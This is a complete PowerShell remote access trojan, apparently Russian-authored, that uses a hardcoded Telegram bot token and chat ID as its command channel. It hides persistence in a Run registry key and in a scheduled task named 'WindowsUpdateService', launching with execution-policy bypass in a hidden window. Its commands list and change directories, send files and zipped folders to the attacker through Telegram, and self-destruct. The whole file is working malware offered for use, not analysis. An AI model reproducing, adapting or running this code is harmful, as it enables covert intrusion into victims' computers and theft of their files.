function Encode-String {
    param([string]$String)
    return [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($String))
}

function Decode-String {
    param([string]$String)
    return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($String))
}

$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"
$BotURL = "https://api.telegram.org/bot$Token/"

$ScriptPath = $MyInvocation.MyCommand.Path
$TaskName = "WindowsUpdateService"
$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# Глобальная переменная для текущей директории
$Global:CurrentDirectory = $pwd.Path

function Send-Telegram {
    param([string]$Text, [string]$FilePath = $null)
    
    try {
        if ($FilePath -and (Test-Path $FilePath)) {
            $FileForm = @{
                chat_id = $ChatID
                document = Get-Item -Path $FilePath
            }
            Invoke-RestMethod -Uri ($BotURL + "sendDocument") -Method Post -Form $FileForm
        } else {
            $Body = @{
                chat_id = $ChatID
                text = $Text
                parse_mode = "HTML"
            }
            Invoke-RestMethod -Uri ($BotURL + "sendMessage") -Method Post -Body $Body
        }
    } catch { }
}

function Compress-Folder {
    param([string]$FolderPath)
    $TempZip = "$env:TEMP\$([System.Guid]::NewGuid().ToString()).zip"
    try {
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::CreateFromDirectory($FolderPath, $TempZip)
        return $TempZip
    } catch {
        return $null
    }
}

function Remove-Persistence {
    Remove-ItemProperty -Path $RegPath -Name $TaskName -ErrorAction SilentlyContinue
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
}

function SelfDestruct {
    Remove-Persistence
    if ($ScriptPath -and (Test-Path $ScriptPath)) {
        Remove-Item $ScriptPath -Force
    }
    exit
}

function Install-Persistence {
    $EncodedScript = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((Get-Content $ScriptPath -Raw)))
    $Payload = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $EncodedScript"
    
    Set-ItemProperty -Path $RegPath -Name $TaskName -Value $Payload -ErrorAction SilentlyContinue
    
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`""
    $Trigger = New-ScheduledTaskTrigger -AtStartup
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
}

function Process-Command {
    param([string]$Command, [string]$Args = "")
    
    switch ($Command) {
        "/help" {
            $HelpText = "Доступные команды:
/help - Показать этот список
/ls [путь] - Список файлов в директории
/cd [путь] - Сменить директорию
/download [путь] - Скачать файл или папку
/selfdestruct - Самоуничтожение RAT"
            Send-Telegram -Text $HelpText
        }
        "/ls" {
            $TargetPath = if ($Args) { $Args } else { $Global:CurrentDirectory }
            try {
                $Items = Get-ChildItem -Path $TargetPath -Force | Select-Object Name, Length, LastWriteTime
                $Result = @()
                foreach ($Item in $Items) {
                    $Type = if ($Item.PSIsContainer) { "DIR" } else { "FILE" }
                    $Size = if ($Item.Length) { "$($Item.Length) bytes" } else { "0 bytes" }
                    $Result += "$Type - $($Item.Name) - $Size - $($Item.LastWriteTime)"
                }
                Send-Telegram -Text ($Result -join "`n")
            } catch {
                Send-Telegram -Text "Ошибка при получении списка файлов"
            }
        }
        "/cd" {
            if ($Args) {
                try {
                    $NewPath = Join-Path $Global:CurrentDirectory $Args
                    if (Test-Path $NewPath -PathType Container) {
                        $Global:CurrentDirectory = $NewPath
                        Send-Telegram -Text "Директория изменена на: $Global:CurrentDirectory"
                    } else {
                        Send-Telegram -Text "Директория не найдена: $Args"
                    }
                } catch {
                    Send-Telegram -Text "Ошибка при смене директории"
                }
            }
        }
        "/download" {
            if ($Args -and (Test-Path $Args)) {
                $Item = Get-Item $Args
                if ($item.PSIsContainer) {
                    $ZipPath = Compress-Folder -FolderPath $Args
                    if ($ZipPath) {
                        Send-Telegram -Text "Папка заархивирована" -FilePath $ZipPath
                        Remove-Item $ZipPath -Force
                    }
                } else {
                    Send-Telegram -Text "Файл отправлен" -FilePath $Args
                }
            } else {
                Send-Telegram -Text "Файл или папка не найдены"
            }
        }
        "/selfdestruct" {
            Send-Telegram -Text "Самоуничтожение активировано"
            SelfDestruct
        }
    }
}

function Send-StartupMessage {
    $StartupMessage = "RAT УСПЕШНО УСТАНОВЛЕН

Доступные команды:
/help - Показать список команд
/ls - Список файлов в директории  
/cd - Сменить директорию
/download - Скачать файл или папку
/selfdestruct - Самоуничтожение RAT"
    
    Send-Telegram -Text $StartupMessage
}

try {
    if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {
        Install-Persistence
        Send-StartupMessage
    }

    while ($true) {
        try {
            $Updates = Invoke-RestMethod -Uri ($BotURL + "getUpdates") -Method Get
            if ($Updates.ok -and $Updates.result) {
                $LastUpdateID = 0
                foreach ($Update in $Updates.result) {
                    $LastUpdateID = $Update.update_id
                    $Message = $Update.message
                    if ($Message -and $Message.chat.id -eq [int64]$ChatID) {
                        $Text = $Message.text
                        if ($Text) {
                            $Parts = $Text -split " ", 2
                            $Command = $Parts[0]
                            $Args = if ($Parts.Count -gt 1) { $Parts[1] } else { "" }
                            Process-Command -Command $Command -Args $Args
                        }
                    }
                }
                # Отмечаем обработанные сообщения
                if ($LastUpdateID -gt 0) {
                    $Body = @{ offset = $LastUpdateID + 1 }
                    Invoke-RestMethod -Uri ($BotURL + "getUpdates") -Method Post -Body $Body | Out-Null
                }
            }
        } catch { }
        Start-Sleep -Seconds 5
    }
} catch {
    Start-Sleep -Seconds 60
}
